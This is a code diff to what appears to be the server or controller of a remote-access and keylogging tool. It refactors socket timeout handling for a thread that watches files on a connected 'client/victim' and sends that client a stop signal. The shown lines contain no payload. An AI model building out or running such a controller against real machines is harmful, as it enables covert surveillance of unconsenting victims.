@@ -36,6 +36,7 @@ def get_user_menu_option(input_stream: TextIO):
         command = int(command)
         while not (constants.MIN_MENU_ITEM_VALUE <= command <= constants.MAX_MENU_ITEM_VALUE):
             print(constants.INVALID_MENU_SELECTION_PROMPT)
+            print(constants.INVALID_MENU_SELECTION)
             command = sys.stdin.readline().strip()
         print(constants.MENU_ACTION_START_MSG.format(command))
         return command
@@ -790,23 +791,27 @@ def watch_file_client_socket(client_socket: socket.socket,
                 # Set socket timeout (for 5 seconds) because there is no more file to watch!
                 client_socket.settimeout(5)
 
+        except socket.timeout:
+            __process_deletion_timeout(client_ip, client_list, client_port, client_socket, file_path, is_keylog)
+            return None
+
         except TimeoutError:
-            print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
-            print(constants.WATCH_FILE_THREAD_TERMINATING)
-
-            # Reset is_watching_file flag to default (False)
-            client_list[client_socket] = (client_ip, client_port, is_keylog, False)
-
-            # Reset SetTimeOut Timer (to prevent disconnection)
-            client_socket.settimeout(None)
-
-            # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
-            client_socket.send(constants.STOP_KEYWORD.encode())
-
-            print(constants.THREAD_STOPPED_MSG)
+            __process_deletion_timeout(client_ip, client_list, client_port, client_socket, file_path, is_keylog)
             return None
 
     # Set WATCH_FILE status to false (Before ending thread)
     client_list[client_socket] = (client_ip, client_port, is_keylog, False)
     print(constants.WATCH_FILE_THREAD_STOP)
     print(constants.WATCH_FILE_THREAD_STOP_SUCCESS)
+
+
+def __process_deletion_timeout(client_ip, client_list, client_port, client_socket, file_path, is_keylog):
+    print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
+    print(constants.WATCH_FILE_THREAD_TERMINATING)
+    # Reset is_watching_file flag to default (False)
+    client_list[client_socket] = (client_ip, client_port, is_keylog, False)
+    # Reset SetTimeOut Timer (to prevent disconnection)
+    client_socket.settimeout(None)
+    # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
+    client_socket.send(constants.STOP_KEYWORD.encode())
+    print(constants.THREAD_STOPPED_MSG)
